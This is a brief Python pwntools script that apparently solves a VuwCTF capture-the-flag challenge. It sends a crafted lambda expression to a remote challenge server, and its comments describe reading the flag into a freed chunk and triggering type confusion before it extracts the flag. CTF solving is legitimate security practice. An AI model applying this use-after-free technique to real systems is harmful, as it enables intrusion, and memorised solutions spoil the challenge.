#!/usr/bin/env python3
from pwn import *

expr = b'(\xc2\xb5x.((\xc2\xb5a.(a a)) ((\xc2\xb5b.b) x)))'

p = remote('chals.vuwctf.com', 9982)
p.recvuntil(b'expression:')
p.sendline(expr)

p.recvuntil(b'continue:')
p.sendline(b'c')  # First reduction

p.recvuntil(b'continue:')
p.sendline(b'r')  # Read flag into freed chunk

p.recvuntil(b'continue:')
p.sendline(b'c')  # Trigger type confusion

output = p.recvall(timeout=15)
match = re.search(rb'VuwCTF\{[^}]+\}', output)
if match:
    print(f"FLAG: {match.group(0).decode()}")
